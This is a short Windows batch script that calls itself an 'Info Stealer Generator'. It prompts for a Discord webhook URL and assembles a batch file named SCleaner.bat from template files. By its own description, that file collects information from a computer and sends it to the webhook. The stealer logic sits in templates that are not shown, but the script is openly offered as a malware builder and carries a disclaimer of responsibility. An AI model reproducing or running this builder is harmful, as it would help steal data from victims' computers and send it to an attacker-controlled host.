@echo off
color 0f
cd /d "%~dp0"
goto is

:IS 
cls
call logo.bat
echo.
echo Info Stealer Generator
echo =======================
echo I AM NOT RESPONSIBLE FOR ANYTHING CAUSED BY THIS SCRIPT.
echo This will generate a batch script that will collect info from a computer and send it to a discord webhook.
echo.
set /p webhook=Please enter a webhook URL: 
if exist "%USERPROFILE%\Downloads\SCleaner.bat" del "%USERPROFILE%\Downloads\SCleaner.bat"
type isgen.txt>>"%USERPROFILE%\Downloads\SCleaner.bat"
echo.>>"%USERPROFILE%\Downloads\SCleaner.bat"
echo set webhook=%webhook%>>"%USERPROFILE%\Downloads\SCleaner.bat"
type isgen2.txt>>"%USERPROFILE%\Downloads\SCleaner.bat"
echo.
echo Info Stealer generated (%USERPROFILE%\Downloads\SCleaner.bat)
pause >nul
exit